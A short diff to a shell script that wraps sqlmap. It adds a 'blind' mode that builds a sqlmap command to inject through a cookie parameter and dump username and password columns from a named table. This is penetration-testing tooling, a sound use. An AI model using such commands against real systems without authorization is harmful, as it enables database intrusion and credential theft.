@@ -2,8 +2,26 @@
 
 # Usage: run_sqlmap.sh <targets_file> <output_dir> [extra_args...]
 
+if [ "$1" == "blind" ]; then
+    # Usage: run_sqlmap.sh blind <url> <cookie_string> <dbms> <cookie_param> <table> <username_col>,<password_col>
+    if [ $# -lt 7 ]; then
+        echo "Usage: $0 blind <url> <cookie_string> <dbms> <cookie_param> <table> <columns>"
+        exit 1
+    fi
+    url="$2"
+    cookie_str="$3"
+    dbms="$4"
+    param="$5"
+    table="$6"
+    cols="$7"
+    
+    echo "sqlmap -u \"$url\" --cookie=\"$cookie_str\" --dbms=$dbms --technique=E --level=3 --risk=2 --batch --threads=1 -p $param -T $table -C $cols --dump --random-agent"
+    exit 0
+fi
+
 if [ $# -lt 2 ]; then
     echo "Usage: $0 <targets_file> <output_dir> [extra_args...]"
+    echo "       $0 blind <url> <cookie_string> <dbms> <cookie_param> <table> <columns>"
     exit 1
 fi
 
